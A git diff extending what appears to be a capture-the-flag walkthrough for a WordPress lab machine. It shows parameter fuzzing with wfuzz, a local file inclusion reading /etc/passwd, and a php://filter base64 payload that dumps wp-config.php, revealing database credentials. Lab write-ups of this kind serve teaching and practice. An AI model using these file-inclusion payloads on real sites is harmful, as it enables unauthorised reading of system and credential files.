@@ -36,3 +36,27 @@ wfuzz -c -u "http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test" -w /usr/sh
 ```
 We will find that the word `key` works.<br>
 Try `http://redrocks.win/NetworkFileManagerPHP.php?key=/etc/passwd` and you will get a good result.
+
+We know that this is a wordpress site. Also, we know that in wordpress sites have wp-config.php file where is a lot of interesting information. If we try to access it we won't see it since our browser automaticly translates php code. However, we can find a php base64 filter on PlayloadsAllTheThings. https://github.com/swisskyrepo/PayloadsAllTheThings 
+Here is an example:<br>
+```
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+```
+Modify it for ourselves:<br>
+```
+http://redrocks.win/NetworkFileManagerPHP.php?key=php://filter/convert.base64-encode/resource=wp-config.php
+```
+And it will give us a base64 string which we can decode and get the original wp-config.php code.<br>
+Here is an interesting string:<br>
+```
+...
+/** MySQL database username */
+define( 'DB_USER', 'john' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' );
+...
+```
+
+
+
